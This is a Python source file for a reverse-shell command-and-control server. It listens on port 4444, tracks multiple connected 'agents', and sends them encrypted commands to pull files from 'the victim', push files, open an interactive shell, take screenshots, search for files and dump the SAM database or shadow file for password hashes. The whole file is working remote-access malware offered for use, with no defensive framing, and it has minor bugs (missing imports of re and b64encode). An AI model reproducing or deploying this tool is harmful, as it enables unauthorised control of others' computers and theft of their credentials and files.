import socket
import threading
from aes_crypt import AESCipher
from base64 import b64decode
import os


class ReverseShellServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = {}
        self.client_id_map = {}

    def start(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[+] Listening on {self.host}:{self.port}...")

        client_id = 1
        while True:
            conn, addr = self.server_socket.accept()
            hostname, os_type = self.get_client_info(conn)
            print(f"[+] Connection from {addr} (hostname: {hostname}, OS: {os_type})")
            self.clients[client_id] = conn
            self.client_id_map[client_id] = {
                "address": addr,
                "hostname": hostname,
                "os": os_type,
                "connection": conn,
            }
            client_thread = threading.Thread(
                target=self.handle_client, args=(conn, addr, client_id)
            )
            client_thread.start()
            client_id += 1

    def get_client_info(self, conn):
        try:
            data = b""
            while True:
                part = conn.recv(1024)
                if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                    data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                    break
                data += part
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            hostname, os_type = decrypted_data.split("|")
            return hostname.strip(), os_type.strip()
        except Exception as e:
            print(f"[!] Failed to get client info: {e}")
            return "Unknown", "Unknown"

    def handle_client(self, conn, addr, client_id):
        try:
            while True:
                command = input("[i] Main Shell> ")
                if command.strip() == "":
                    continue
                if command.lower() == "help":
                    self.show_help()
                elif command.lower() == "list":
                    self.list_clients()
                elif (
                    command.split()[0].isdigit()
                    and int(command.split()[0]) in self.clients
                ):
                    self.handle_agent_command(command)
                else:
                    print("[!] Invalid command. Type 'help' for the list of commands.")
        except ConnectionResetError:
            print(f"[x] Connection with {addr} lost.")
        finally:
            conn.close()
            del self.clients[client_id]
            del self.client_id_map[client_id]

    def show_help(self):
        print("\n[i] Available Commands:")
        print("[i] help         : Show this help message")
        print("[i] list         : List all connected agents")
        print(
            "[i] <agent_id> <command> : Send command to the specified agent (e.g., '1 upload /path/to/file')"
        )
        print("[i] Commands to send to agents (specify agent_id before the command):")
        print(
            "[i]   download <path>     : Download files from the victim to the server"
        )
        print("[i]   upload <path>       : Upload files from the server to the victim")
        print("[i]   shell               : Open an interactive shell (bash or cmd)")
        print(
            "[i]   ipconfig            : Get the network configuration of the victim machine"
        )
        print("[i]   screenshot          : Take a screenshot of the victim machine")
        print("[i]   search <file>       : Search for a file on the victim machine")
        print(
            "[i]   hashdump            : Retrieve the SAM database or shadow file from the victim machine\n"
        )

    def list_clients(self):
        print("\n[+] Active agents:")
        for client_id, info in self.client_id_map.items():
            print(
                f"[+] {client_id}: {info['address']} (hostname: {info['hostname']}, OS: {info['os']})"
            )
        print()

    def handle_agent_command(self, command):
        try:
            parts = command.split(" ", 2)
            client_id = int(parts[0])
            agent_command = parts[1]
            if len(parts) > 2:
                args = parts[2]
            else:
                args = ""
        except IndexError:
            print("[!] Error: Invalid command format")
            return
        except ValueError:
            print("[!] Error: Invalid agent ID")
            return

        if client_id in self.clients:
            conn = self.clients[client_id]
            if agent_command == "download":
                self.handle_download(args, conn)
            elif agent_command == "upload":
                self.handle_upload(args, conn)
            elif agent_command == "shell":
                self.interactive_shell(conn)
            elif agent_command == "ipconfig":
                self.handle_ipconfig(conn, client_id)
            elif agent_command == "search":
                self.handle_search(args, conn)
            elif agent_command == "hashdump":
                self.handle_hashdump(conn)
            elif agent_command == "screenshot":
                self.handle_screenshot(conn, client_id)
            else:
                self.send_command(agent_command + " " + args, conn)
        else:
            print(f"[x] Error: Client {client_id} not found")

    def handle_screenshot(self, conn, client_id):
        file_path = f"screenshot_{client_id}.png"
        conn.send(AESCipher.encrypt("screenshot").encode("utf-8"))
        try:
            with open(file_path, "wb") as f:
                while True:
                    data = conn.recv(4096).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"[+] Screenshot saved to {file_path}.")
        except Exception as e:
            print(f"[x] Failed to save screenshot: {e}")

    def handle_ipconfig(self, conn, client_id):
        os_type = self.client_id_map[client_id]["os"]
        if os_type == "Windows":
            command = "powershell -Command \"Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne 'Disconnected' } | Select-Object -ExpandProperty IPv4Address,InterfaceAlias\""
        else:
            command = "hostname -I | awk '{print $1}'"
        conn.send(AESCipher.encrypt(command).encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(1024)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            interfaces = self.extract_interfaces_and_ips(decrypted_data)
            print("[+] Local IP addresses and their interfaces:")
            for interface, ip in interfaces.items():
                print(f"[+] {interface}: {ip}")
        except Exception as e:
            print(f"[x] Failed to decrypt ipconfig data: {e}")

    def extract_interfaces_and_ips(self, data):
        interfaces = {}
        # Regex pattern for extracting interface names and IP addresses
        windows_pattern = re.compile(
            r"InterfaceAlias\s+:\s+(?P<interface>[\w\s]+).*?IPv4Address\s+:\s+(?P<ip>\d+\.\d+\.\d+\.\d+)",
            re.DOTALL,
        )
        linux_pattern = re.compile(r"(\w+):\s.*\sinet\s(?P<ip>\d+\.\d+\.\d+\.\d+)")

        if "InterfaceAlias" in data:
            matches = windows_pattern.finditer(data)
            for match in matches:
                interfaces[match.group("interface").strip()] = match.group("ip").strip()
        else:
            matches = linux_pattern.finditer(data)
            for match in matches:
                interfaces[match.group(1).strip()] = match.group("ip").strip()

        return interfaces

    def handle_download(self, file_path, conn):
        conn.send(AESCipher.encrypt(f"download {file_path}").encode("utf-8"))
        try:
            with open(file_path, "wb") as f:
                while True:
                    data = conn.recv(4096).decode("utf-8")
                    decrypted_data = AESCipher.decrypt(data)
                    if decrypted_data == "EOF":
                        break
                    f.write(b64decode(decrypted_data))
            print(f"[+] File {file_path} downloaded successfully.")
        except Exception as e:
            print(f"[x] Failed to download {file_path}: {e}")

    def handle_upload(self, file_path, conn):
        conn.send(AESCipher.encrypt(f"upload {file_path}").encode("utf-8"))
        buffer_size = int(input("[i] Enter buffer size for upload (in bytes): "))
        try:
            with open(file_path, "rb") as f:
                while True:
                    chunk = f.read(buffer_size)
                    if not chunk:
                        break
                    conn.send(
                        AESCipher.encrypt(b64encode(chunk).decode("utf-8")).encode(
                            "utf-8"
                        )
                    )
            conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
            print(f"[+] File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"[x] Failed to upload {file_path}: {e}")
            conn.send(AESCipher.encrypt("ERROR").encode("utf-8"))

    def handle_search(self, file_name, conn):
        conn.send(AESCipher.encrypt(f"search {file_name}").encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(1024)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            print("[+] Search Results:")
            print(decrypted_data)
        except Exception as e:
            print(f"[x] Failed to decrypt search data: {e}")

    def handle_hashdump(self, conn):
        conn.send(AESCipher.encrypt("hashdump").encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(1024)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            print("[+] Hashdump Results:")
            print(decrypted_data)
        except Exception as e:
            print(f"[x] Failed to decrypt hashdump data: {e}")

    def interactive_shell(self, conn):
        while True:
            shell_command = input("[i] Shell (type 'exit' to return)> ")
            if shell_command.lower() == "exit":
                break
            if shell_command:
                self.send_command(shell_command, conn)

    def send_command(self, command, conn):
        conn.send(AESCipher.encrypt(command).encode("utf-8"))
        data = b""
        while True:
            part = conn.recv(1024)
            if part.endswith(AESCipher.encrypt("EOF").encode("utf-8")):
                data += part[: -len(AESCipher.encrypt("EOF").encode("utf-8"))]
                break
            data += part
        try:
            decrypted_data = AESCipher.decrypt(data.decode("utf-8"))
            if decrypted_data:
                print(decrypted_data)
        except Exception as e:
            print(f"[x] Failed to decrypt command response: {e}")


if __name__ == "__main__":
    server = ReverseShellServer("0.0.0.0", 4444)
    server.start()
